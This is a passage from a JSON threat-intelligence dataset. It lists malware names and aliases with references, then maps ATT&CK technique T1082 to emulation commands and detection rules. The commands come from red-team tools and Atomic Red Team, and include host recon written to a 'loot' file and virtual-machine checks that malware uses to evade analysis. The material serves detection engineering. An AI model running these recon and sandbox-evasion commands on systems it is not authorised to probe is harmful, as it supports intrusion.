"Agent.BTZ"], "family": [], "comments": null}, {"links": ["http://www.secureworks.com/cyber-threat-intelligence/threats/secrets-of-the-comfoo-masters/"], "names": ["Comfoo"], "family": [], "comments": "RSA incident, Red October"}, {"links": ["http://www.secureworks.com/cyber-threat-intelligence/threats/secrets-of-the-comfoo-masters/"], "names": ["RSPlug", "DNSChanger"], "family": ["ZLob"], "comments": null}, {"links": ["https://www.secureworks.com/research/secrets-of-the-comfoo-masters", "https://www.symantec.com/security_response/writeup.jsp?docid=2012-051515-2843-99&tabid=2", "https://citizenlab.org/2012/09/citizen-lab-technical-brief-iexpl0re-rat/"], "names": ["Comfoo", "Briba", "Sharky RAT", "IEXPLORE RAT"], "family": [], "comments": null}, {"links": ["http://ijact.org/volume3issue4/IJ0340004.pdf", "https://github.com/RobinDavid/LSB-Steganography"], "names": ["LSB"], "family": [], "comments": null}, {"links": ["http://researchcenter.paloaltonetworks.com/2015/12/attack-on-french-diplomat-linked-to-operation-lotus-blossom/"], "names": ["Elise", "Emissary", "LStudio"], "family": [], "comments": null}, {"links": ["http://researchcenter.paloaltonetworks.com/2016/01/scarlet-mimic-years-long-espionage-targets-minority-activists/"], "names": ["Tran Duy Linh", "WingD", "MNKit"], "family": [], "comments": null}, {"links": ["https://www.rsaconference.com/writable/presentations/file_upload/hta-w02-dissecting-derusbi.pdf", "https://www.rsaconference.com/writable/presentations/file_upload/crwd-t11-hide_and_seek-how_threat_actors_respond_in_the_face_of_public_exposure.pdf"], "names": ["Mivast", "Sakula (variant)", "Shyape", "Photo", "Derusbi"], "family": ["Derusbi"], "comments": "Chinese Backdoor, Winnti"}, {"links": [], "names": ["Tavdig", "Epic", "Wipbot"], "family": [], "comments": null}, {"links": [], "names": ["Cobra", "Snake Rootkit", "Carbon Rootkit"], "family": [], "comments": null}, {"links": [], "names": ["Uroburos", "Turla"], "family": [], "comments": null}, {"links": ["http://blog.vsec.com.vn/apt/initial-winnti-analysis-against-vietnam-game-company.html#more-73", "https://securelist.com/?s=winnti"], "names": ["Rbdoor", "HIGHNOON", "Derusbi", "Winnti (Network Driver Component)"], "family": [], "comments": "P2P Backdoor, Driver loaded into memory"}, {"links": ["http://www.ampliasecurity.com/research/windows-credentials-editor/"], "names": ["AceHash", "WCE"], "family": [], "comments": "Password Dumper, PTH"}, {"links": ["https://github.com/gentilkiwi/mimikatz"], "names": ["Powerkatz", "Mimikatz"], "family": [], "comments": "Password Dumper, PTH, DCSync, SkeletonKey, Golden/Silver Tickets"}, {"links": ["http://williamshowalter.com/a-universal-windows-bootkit/"], "names": ["HDD Rootkit", "HDRoot"], "family": [], "comments": "Winnti / Axiom Group"}, {"links": ["https://github.com/kbandla/APTnotes/blob/master/2014/LeoUncia_OrcaRat.pdf", "http://pwc.blogs.com/cyber_security_updates/2014/10/orcarat-a-whale-of-a-tale.html"], "names": ["LeoUnica", "OrcaRAT"], "family": [], "comments": "Found with Comfoo malware"}, {"links": ["https://www.arbornetworks.com/blog/asert/illuminating-the-etumbot-apt-backdoor/", "https://cysinfo.com/sx-2nd-meetup-reversing-and-decrypting-the-communications-of-apt-malware/"], "names": ["Etumbot"], "family": [], "comments": "Assocaited with Numbered Panda/APT12"}, {"links": [], "names": ["xcmd"], "family": [], "comments": "Similar to psexec. Used in OPM and Anthem breaches"}, {"links": [], "names": ["NjRAT"], "family": [], "comments": null}, {"links": ["http://www.welivesecurity.com/2016/10/25/lifting-lid-sednit-closer-look-software-uses/"], "names": ["Fysbis", "X-Agent"], "family": [], "comments": "Used by Sofacy group, Linux backdoor"}, {"links": ["https://t.co/x0jmdEp45w"], "names": ["jRAT", "jSocket", "Unrecom", "AlienSpy", "jFrutas", "Frutas", "Adwind RAT"], "family": ["Adwind"], "comments": null}, {"links": [], "names": ["Flacher", "Jiripbot"], "family": [], "comments": "Wild Neutron"}, {"links": ["https://github.com/quasar/QuasarRAT/tree/v1.2.0.0"], "names": ["Quasar RAT"], "family": [], "comments": null}, {"links": [], "names": ["MultiTool", "Mtool"], "family": [], "comments": "Cn Group Tool for Recon"}, {"links": ["https://securelist.com/apt-trends-report-q2-2017/79332/"], "names": ["Manuscrypt ", "FallChill"], "family": [], "comments": "Backdoor. Used by Lazarus Group, Bluenoroff."}, {"links": ["https://researchcenter.paloaltonetworks.com/2016/05/prince-of-persia-infy-malware-active-in-decade-of-targeted-attacks/"], "names": ["Infy M", "Infy"], "family": [], "comments": null}, {"links": ["http://www.clearskysec.com/dustysky/"], "names": ["NeD Worm", "DustySky"], "family": [], "comments": null}, {"links": ["https://blog.crysys.hu/2018/03/territorial-dispute-nsas-perspective-on-apt-landscape/", "https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=VirTool:WinNT/Exforel.A"], "names": ["Exforel"], "family": [], "comments": "SIG30 in NSA report, Chinese origin"}, {"links": [], "names": ["LoJax"], "family": [], "comments": null}, {"links": ["http://v3lo.tistory.com/24", "https://blog.talosintelligence.com/2018/01/korea-in-crosshairs.html"], "names": ["ROKRAT"], "family": [], "comments": null}, {"links": ["https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/ryuk-exploring-the-human-connection/", "https://blog.kryptoslogic.com/malware/2019/01/10/dprk-emotet.html", "https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/ryuk-ransomware-attack-rush-to-attribution-misses-the-point/", "https://research.checkpoint.com/ryuk-ransomware-targeted-campaign-break/"], "names": ["Hermes", "Ryuk"], "family": [], "comments": "Ryuk based on Hermes GRIM SPIDER (cybercrime)"}, {"links": [], "names": ["Shunnael", "X-Tunnel", "Xtunnel"], "family": [], "comments": "Used by APT28 / Sofacy"}, {"links": ["https://medium.com/chronicle-blog/who-is-gossipgirl-3b4170f846c0"], "names": ["sKyWIper", "Flamer", "Flame"], "family": [], "comments": "Used by GOSSIPGIRL (umbrella group)"}]}, "techniques": [{"commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "ver", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "shell ver", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "set", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "shell set", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "get_env.rb", "name": "Metasploit"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "net config workstation\nnet config server", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "shell net config workstation\nshell net config server", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "systeminfo [/s COMPNAME] [/u DOMAIN\\user] [/p password]", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "systemprofiler tool if no access yet (victim browses to website)\nor\nshell systeminfo (if you already have a beacon)", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "sysinfo, run winenum, get_env.rb", "name": "Metasploit"}, {"source": "atomics/T1082/T1082.yaml", "command": "systeminfo\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum\n", "name": null}, {"source": "atomics/T1082/T1082.yaml", "command": "systemsetup\nsystem_profiler\nls -al /Applications\n", "name": null}, {"source": "atomics/T1082/T1082.yaml", "command": "uname -a >> /tmp/loot.txt\ncat /etc/lsb-release >> /tmp/loot.txt\ncat /etc/redhat-release >> /tmp/loot.txt\nuptime >> /tmp/loot.txt\ncat /etc/issue >> /tmp/loot.txt\n", "name": null}, {"source": "atomics/T1082/T1082.yaml", "command": "cat /sys/class/dmi/id/bios_version | grep -i amazon\ncat /sys/class/dmi/id/product_name | grep -i \"Droplet\\|HVM\\|VirtualBox\\|VMware\"\ncat /sys/class/dmi/id/chassis_vendor | grep -i \"Xen\\|Bochs\\|QEMU\"\nsudo dmidecode | grep -i \"microsoft\\|vmware\\|virtualbox\\|quemu\\|domu\"\ncat /proc/scsi/scsi | grep -i \"vmware\\|vbox\"\ncat /proc/ide/hd0/model | grep -i \"vmware\\|vbox\\|qemu\\|virtual\"\nsudo lspci | grep -i \"vmware\\|virtualbox\"\nsudo lscpu | grep -i \"Xen\\|KVM\\|Microsoft\"\n", "name": null}, {"source": "atomics/T1082/T1082.yaml", "command": "sudo lsmod | grep -i \"vboxsf\\|vboxguest\"\nsudo lsmod | grep -i \"vmw_baloon\\|vmxnet\"\nsudo lsmod | grep -i \"xen-vbd\\|xen-vnif\"\nsudo lsmod | grep -i \"virtio_pci\\|virtio_net\"\nsudo lsmod | grep -i \"hv_vmbus\\|hv_blkvsc\\|hv_netvsc\\|hv_utils\\|hv_storvsc\"\n", "name": null}, {"source": "atomics/T1082/T1082.yaml", "command": "hostname\n", "name": null}, {"source": "atomics/T1082/T1082.yaml", "command": "hostname\n", "name": null}, {"source": "atomics/T1082/T1082.yaml", "command": "REG QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid\n", "name": null}, {"source": "data/abilities/discovery/29451844-9b76-4e16-a9ee-d6feab4b24db.yml", "command": {"windows": {"psh,pwsh": {"command": "$PSVersionTable\n"}}}, "name": "Discover the PowerShell version"}, {"source": "data/abilities/discovery/30732a56-4a23-4307-9544-09caf2ed29d5.yml", "command": {"darwin": {"sh": {"command": "find / -type d -user #{host.user.name} \\( -perm -g+w -or -perm -o+w \\) 2>/dev/null -exec ls -adl {} \\;\n"}}, "linux": {"sh": {"command": "find / -type d -user #{host.user.name} \\( -perm -g+w -or -perm -o+w \\) 2>/dev/null -exec ls -adl {} \\;\n"}}}, "name": "Discover all directories containing deletable files by user"}, {"source": "data/abilities/discovery/b6b105b9-41dc-490b-bc5c-80d699b82ce8.yml", "command": {"windows": {"psh": {"command": "[environment]::OSVersion.Version\n"}}}, "name": "Find OS Version"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/computerdetails", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/computerdetails", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/winenum", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/winenum", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_computer", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_computer", "name": "Empire Module Command"}], "command_list": ["ver", "shell ver", "set", "shell set", "get_env.rb", "net config workstation\nnet config server", "shell net config workstation\nshell net config server", "systeminfo [/s COMPNAME] [/u DOMAIN\\user] [/p password]", "systemprofiler tool if no access yet (victim browses to website)\nor\nshell systeminfo (if you already have a beacon)", "sysinfo, run winenum, get_env.rb", "systeminfo\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum\n", "systemsetup\nsystem_profiler\nls -al /Applications\n", "uname -a >> /tmp/loot.txt\ncat /etc/lsb-release >> /tmp/loot.txt\ncat /etc/redhat-release >> /tmp/loot.txt\nuptime >> /tmp/loot.txt\ncat /etc/issue >> /tmp/loot.txt\n", "cat /sys/class/dmi/id/bios_version | grep -i amazon\ncat /sys/class/dmi/id/product_name | grep -i \"Droplet\\|HVM\\|VirtualBox\\|VMware\"\ncat /sys/class/dmi/id/chassis_vendor | grep -i \"Xen\\|Bochs\\|QEMU\"\nsudo dmidecode | grep -i \"microsoft\\|vmware\\|virtualbox\\|quemu\\|domu\"\ncat /proc/scsi/scsi | grep -i \"vmware\\|vbox\"\ncat /proc/ide/hd0/model | grep -i \"vmware\\|vbox\\|qemu\\|virtual\"\nsudo lspci | grep -i \"vmware\\|virtualbox\"\nsudo lscpu | grep -i \"Xen\\|KVM\\|Microsoft\"\n", "sudo lsmod | grep -i \"vboxsf\\|vboxguest\"\nsudo lsmod | grep -i \"vmw_baloon\\|vmxnet\"\nsudo lsmod | grep -i \"xen-vbd\\|xen-vnif\"\nsudo lsmod | grep -i \"virtio_pci\\|virtio_net\"\nsudo lsmod | grep -i \"hv_vmbus\\|hv_blkvsc\\|hv_netvsc\\|hv_utils\\|hv_storvsc\"\n", "hostname\n", "hostname\n", "REG QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid\n", {"windows": {"psh,pwsh": {"command": "$PSVersionTable\n"}}}, {"darwin": {"sh": {"command": "find / -type d -user #{host.user.name} \\( -perm -g+w -or -perm -o+w \\) 2>/dev/null -exec ls -adl {} \\;\n"}}, "linux": {"sh": {"command": "find / -type d -user #{host.user.name} \\( -perm -g+w -or -perm -o+w \\) 2>/dev/null -exec ls -adl {} \\;\n"}}}, {"windows": {"psh": {"command": "[environment]::OSVersion.Version\n"}}}, "powershell/situational_awareness/host/computerdetails", "powershell/situational_awareness/host/computerdetails", "powershell/situational_awareness/host/winenum", "powershell/situational_awareness/host/winenum", "powershell/situational_awareness/network/powerview/get_computer", "powershell/situational_awareness/network/powerview/get_computer"], "technique_id": "T1082", "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1082", "Built-in Windows Command": "ver", "Cobalt Strike": "shell ver", "Description": "Get the Windows OS version that's running", "Metasploit": ""}}, {"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1082", "Built-in Windows Command": "set", "Cobalt Strike": "shell set", "Description": "Print all of the environment variables", "Metasploit": "get_env.rb"}}, {"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1082", "Built-in Windows Command": "net config workstation\nnet config server", "Cobalt Strike": "shell net config workstation\nshell net config server", "Description": "Get computer name, username, OS software version, domain information, DNS, logon domain", "Metasploit": ""}}, {"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1082", "Built-in Windows Command": "systeminfo [/s COMPNAME] [/u DOMAIN\\user] [/p password]", "Cobalt Strike": "systemprofiler tool if no access yet (victim browses to website)\nor\nshell systeminfo (if you already have a beacon)", "Description": "Displays detailed configuration information about a computer and its operating system, including operating system configuration, security information, product ID, and hardware properties, such as RAM, disk space, and network cards", "Metasploit": "sysinfo, run winenum, get_env.rb"}}, {"Atomic Red Team Test - System Information Discovery": {"display_name": "System Information Discovery", "atomic_tests": [{"description": "Identify System Info\n", "supported_platforms": ["windows"], "name": "System Information Discovery", "executor": {"elevation_required": false, "command": "systeminfo\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum\n", "name": "command_prompt"}}, {"description": "Identify System Info\n", "supported_platforms": ["linux", "macos"], "name": "System Information Discovery", "executor": {"command": "systemsetup\nsystem_profiler\nls -al /Applications\n", "name": "sh"}}, {"description": "Identify System Info\n", "supported_platforms": ["linux", "macos"], "name": "List OS Information", "executor": {"command": "uname -a >> /tmp/loot.txt\ncat /etc/lsb-release >> /tmp/loot.txt\ncat /etc/redhat-release >> /tmp/loot.txt\nuptime >> /tmp/loot.txt\ncat /etc/issue >> /tmp/loot.txt\n", "name": "sh"}}, {"description": "Identify virtual machine hardware. This technique is used by the Pupy RAT and other malware.\n", "supported_platforms": ["linux"], "name": "Linux VM Check via Hardware", "executor": {"command": "cat /sys/class/dmi/id/bios_version | grep -i amazon\ncat /sys/class/dmi/id/product_name | grep -i \"Droplet\\|HVM\\|VirtualBox\\|VMware\"\ncat /sys/class/dmi/id/chassis_vendor | grep -i \"Xen\\|Bochs\\|QEMU\"\nsudo dmidecode | grep -i \"microsoft\\|vmware\\|virtualbox\\|quemu\\|domu\"\ncat /proc/scsi/scsi | grep -i \"vmware\\|vbox\"\ncat /proc/ide/hd0/model | grep -i \"vmware\\|vbox\\|qemu\\|virtual\"\nsudo lspci | grep -i \"vmware\\|virtualbox\"\nsudo lscpu | grep -i \"Xen\\|KVM\\|Microsoft\"\n", "name": "bash"}}, {"description": "Identify virtual machine guest kernel modules. This technique is used by the Pupy RAT and other malware.\n", "supported_platforms": ["linux"], "name": "Linux VM Check via Kernel Modules", "executor": {"command": "sudo lsmod | grep -i \"vboxsf\\|vboxguest\"\nsudo lsmod | grep -i \"vmw_baloon\\|vmxnet\"\nsudo lsmod | grep -i \"xen-vbd\\|xen-vnif\"\nsudo lsmod | grep -i \"virtio_pci\\|virtio_net\"\nsudo lsmod | grep -i \"hv_vmbus\\|hv_blkvsc\\|hv_netvsc\\|hv_utils\\|hv_storvsc\"\n", "name": "bash"}}, {"description": "Identify system hostname for Windows.\n", "supported_platforms": ["windows"], "name": "Hostname Discovery (Windows)", "executor": {"elevation_required": false, "command": "hostname\n", "name": "command_prompt"}}, {"description": "Identify system hostname for Linux and macOS systems.\n", "supported_platforms": ["linux", "macos"], "name": "Hostname Discovery", "executor": {"elevation_required": false, "command": "hostname\n", "name": "bash"}}, {"description": "Identify the Windows MachineGUID value for a system.\n", "supported_platforms": ["windows"], "name": "Windows MachineGUID Discovery", "executor": {"elevation_required": false, "command": "REG QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid\n", "name": "command_prompt"}}], "attack_technique": "T1082"}}, {"Mitre Stockpile - Discover the PowerShell version": {"platforms": {"windows": {"psh,pwsh": {"command": "$PSVersionTable\n"}}}, "description": "Discover the PowerShell version", "tactic": "discovery", "technique": {"attack_id": "T1082", "name": "System Information Discovery"}, "id": "29451844-9b76-4e16-a9ee-d6feab4b24db", "name": "PowerShell version"}}, {"Mitre Stockpile - Discover all directories containing deletable files by user": {"platforms": {"darwin": {"sh": {"command": "find / -type d -user #{host.user.name} \\( -perm -g+w -or -perm -o+w \\) 2>/dev/null -exec ls -adl {} \\;\n"}}, "linux": {"sh": {"command": "find / -type d -user #{host.user.name} \\( -perm -g+w -or -perm -o+w \\) 2>/dev/null -exec ls -adl {} \\;\n"}}}, "requirements": [{"plugins.stockpile.app.requirements.paw_provenance": [{"source": "host.user.name"}]}], "description": "Discover all directories containing deletable files by user", "tactic": "discovery", "technique": {"attack_id": "T1082", "name": "System Information Discovery"}, "id": "30732a56-4a23-4307-9544-09caf2ed29d5", "name": "Find deletable dirs (per user)"}}, {"Mitre Stockpile - Find OS Version": {"platforms": {"windows": {"psh": {"command": "[environment]::OSVersion.Version\n"}}}, "description": "Find OS Version", "tactic": "discovery", "technique": {"attack_id": "T1082", "name": "System Information Discovery"}, "id": "b6b105b9-41dc-490b-bc5c-80d699b82ce8", "name": "Find OS Version"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1082", "Empire Module": "powershell/situational_awareness/host/computerdetails", "Technique": "System Information Discovery", "ATT&CK Technique #2": "T1005", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/host/computerdetails\":  [\"T1082\",\"T1005\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1082", "Empire Module": "powershell/situational_awareness/host/winenum", "Technique": "System Information Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/host/winenum\":  [\"T1082\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1082", "Empire Module": "powershell/situational_awareness/network/powerview/get_computer", "Technique": "System Information Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_computer\":  [\"T1082\"],"}}], "queries": [{"query": "Sysmon| where EventID == 1 and (process_path contains\"sysinfo.exe\"or process_path contains \"reg.exe\")and process_command_line contains \"reg*query HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\Disk\\\\Enum\"", "product": "Azure Sentinel", "name": "System Information Discovery"}, {"query": "title: Reconnaissance Activity with Net Command\nid: 2887e914-ce96-435f-8105-593937e90757\nstatus: experimental\ndescription: Detects a set of commands often used in recon stages by different attack groups\nreferences:\n    - https://twitter.com/haroonmeer/status/939099379834658817\n    - https://twitter.com/c_APT_ure/status/939475433711722497\n    - https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.html\nauthor: Florian Roth, Markus Neis\ndate: 2018/08/22\nmodified: 2018/12/11\ntags:\n    - attack.discovery\n    - attack.t1087\n    - attack.t1082\n    - car.2016-03-001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - tasklist\n            - net time\n            - systeminfo\n            - whoami\n            - nbtstat\n            - net start\n            - '*\\net1 start'\n            - qprocess\n            - nslookup\n            - hostname.exe\n            - '*\\net1 user /domain'\n            - '*\\net1 group /domain'\n            - '*\\net1 group \"domain admins\" /domain'\n            - '*\\net1 group \"Exchange Trusted Subsystem\" /domain'\n            - '*\\net1 accounts /domain'\n            - '*\\net1 user net localgroup administrators'\n            - netstat -an\n    timeframe: 15s\n    condition: selection | count() by CommandLine > 4\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Reconnaissance Activity with Net Command\nid: 2887e914-ce96-435f-8105-593937e90757\nstatus: experimental\ndescription: Detects a set of commands often used in recon stages by different attack groups\nreferences:\n    - https://twitter.com/haroonmeer/status/939099379834658817\n    - https://twitter.com/c_APT_ure/status/939475433711722497\n    - https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.html\nauthor: Florian Roth, Markus Neis\ndate: 2018/08/22\nmodified: 2018/12/11\ntags:\n    - attack.discovery\n    - attack.t1087\n    - attack.t1082\n    - car.2016-03-001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - tasklist\n            - net time\n            - systeminfo\n            - whoami\n            - nbtstat\n            - net start\n            - '*\\net1 start'\n            - qprocess\n            - nslookup\n            - hostname.exe\n            - '*\\net1 user /domain'\n            - '*\\net1 group /domain'\n            - '*\\net1 group \"domain admins\" /domain'\n            - '*\\net1 group \"Exchange Trusted Subsystem\" /domain'\n            - '*\\net1 accounts /domain'\n            - '*\\net1 user net localgroup administrators'\n            - netstat -an\n    timeframe: 15s\n    condition: selection | count() by CommandLine > 4\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Reconnaissance-Activity-with-Net-Command <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Reconnaissance Activity with Net Command\",\\n    \"description\": \"Detects a set of commands often used in recon stages by different attack groups\",\\n    \"tags\": [\\n      \"attack.discovery\",\\n      \"attack.t1087\",\\n      \"attack.t1082\",\\n      \"car.2016-03-001\"\\n    ],\\n    \"query\": \"CommandLine.keyword:(tasklist OR net\\\\\\\\ time OR systeminfo OR whoami OR nbtstat OR net\\\\\\\\ start OR *\\\\\\\\\\\\\\\\net1\\\\\\\\ start OR qprocess OR nslookup OR hostname.exe OR *\\\\\\\\\\\\\\\\net1\\\\\\\\ user\\\\\\\\ \\\\\\\\/domain OR *\\\\\\\\\\\\\\\\net1\\\\\\\\ group\\\\\\\\ \\\\\\\\/domain OR *\\\\\\\\\\\\\\\\net1\\\\\\\\ group\\\\\\\\ \\\\\\\\\\\\\"domain\\\\\\\\ admins\\\\\\\\\\\\\"\\\\\\\\ \\\\\\\\/domain OR *\\\\\\\\\\\\\\\\net1\\\\\\\\ group\\\\\\\\ \\\\\\\\\\\\\"Exchange\\\\\\\\ Trusted\\\\\\\\ Subsystem\\\\\\\\\\\\\"\\\\\\\\ \\\\\\\\/domain OR *\\\\\\\\\\\\\\\\net1\\\\\\\\ accounts\\\\\\\\ \\\\\\\\/domain OR *\\\\\\\\\\\\\\\\net1\\\\\\\\ user\\\\\\\\ net\\\\\\\\ localgroup\\\\\\\\ administrators OR netstat\\\\\\\\ \\\\\\\\-an)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"15s\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:(tasklist OR net\\\\\\\\ time OR systeminfo OR whoami OR nbtstat OR net\\\\\\\\ start OR *\\\\\\\\\\\\\\\\net1\\\\\\\\ start OR qprocess OR nslookup OR hostname.exe OR *\\\\\\\\\\\\\\\\net1\\\\\\\\ user\\\\\\\\ \\\\\\\\/domain OR *\\\\\\\\\\\\\\\\net1\\\\\\\\ group\\\\\\\\ \\\\\\\\/domain OR *\\\\\\\\\\\\\\\\net1\\\\\\\\ group\\\\\\\\ \\\\\\\\\\\\\"domain\\\\\\\\ admins\\\\\\\\\\\\\"\\\\\\\\ \\\\\\\\/domain OR *\\\\\\\\\\\\\\\\net1\\\\\\\\ group\\\\\\\\ \\\\\\\\\\\\\"Exchange\\\\\\\\ Trusted\\\\\\\\ Subsystem\\\\\\\\\\\\\"\\\\\\\\ \\\\\\\\/domain OR *\\\\\\\\\\\\\\\\net1\\\\\\\\ accounts\\\\\\\\ \\\\\\\\/domain OR *\\\\\\\\\\\\\\\\net1\\\\\\\\ user\\\\\\\\ net\\\\\\\\ localgroup\\\\\\\\ administrators OR netstat\\\\\\\\ \\\\\\\\-an)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          },\\n          \"aggs\": {\\n            \"by\": {\\n              \"terms\": {\\n                \"field\": \"CommandLine.keyword\",\\n                \"size\": 10,\\n                \"order\": {\\n                  \"_count\": \"desc\"\\n                },\\n                \"min_doc_count\": 5\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.aggregations.by.buckets.0.doc_count\": {\\n        \"gt\": 4\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Reconnaissance Activity with Net Command\\'\",\\n        \"body\": \"Hits:\\\\n{{#aggregations.by.buckets}}\\\\n {{key}} {{doc_count}}\\\\n{{/aggregations.by.buckets}}\\\\n\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(CommandLine=\"tasklist\" OR CommandLine=\"net time\" OR CommandLine=\"systeminfo\" OR CommandLine=\"whoami\" OR CommandLine=\"nbtstat\" OR CommandLine=\"net start\" OR CommandLine=\"*\\\\\\\\net1 start\" OR CommandLine=\"qprocess\" OR CommandLine=\"nslookup\" OR CommandLine=\"hostname.exe\" OR CommandLine=\"*\\\\\\\\net1 user /domain\" OR CommandLine=\"*\\\\\\\\net1 group /domain\" OR CommandLine=\"*\\\\\\\\net1 group \\\\\"domain admins\\\\\" /domain\" OR CommandLine=\"*\\\\\\\\net1 group \\\\\"Exchange Trusted Subsystem\\\\\" /domain\" OR CommandLine=\"*\\\\\\\\net1 accounts /domain\" OR CommandLine=\"*\\\\\\\\net1 user net localgroup administrators\" OR CommandLine=\"netstat -an\") | eventstats count as val by CommandLine| search val > 4", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine IN [\"tasklist\", \"net time\", \"systeminfo\", \"whoami\", \"nbtstat\", \"net start\", \"*\\\\\\\\net1 start\", \"qprocess\", \"nslookup\", \"hostname.exe\", \"*\\\\\\\\net1 user /domain\", \"*\\\\\\\\net1 group /domain\", \"*\\\\\\\\net1 group \\\\\"domain admins\\\\\" /domain\", \"*\\\\\\\\net1 group \\\\\"Exchange Trusted Subsystem\\\\\" /domain\", \"*\\\\\\\\net1 accounts /domain\", \"*\\\\\\\\net1 user net localgroup administrators\", \"netstat -an\"]) | chart count() as val by CommandLine | search val > 4", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P \\'^(?:.*tasklist|.*net time|.*systeminfo|.*whoami|.*nbtstat|.*net start|.*.*\\\\net1 start|.*qprocess|.*nslookup|.*hostname\\\\.exe|.*.*\\\\net1 user /domain|.*.*\\\\net1 group /domain|.*.*\\\\net1 group \"domain admins\" /domain|.*.*\\\\net1 group \"Exchange Trusted Subsystem\" /domain|.*.*\\\\net1 accounts /domain|.*.*\\\\net1 user net localgroup administrators|.*netstat -an)\\'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "Yml\ntitle: Information found in the windows system\ndescription: windows server 2012 test results\nreferences: https://github.com/0xpwntester/CB-Threat-Hunting/blob/master/ATT%26CK/T1082-%20systeminfo%20executions.md\ntags: T1082\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: 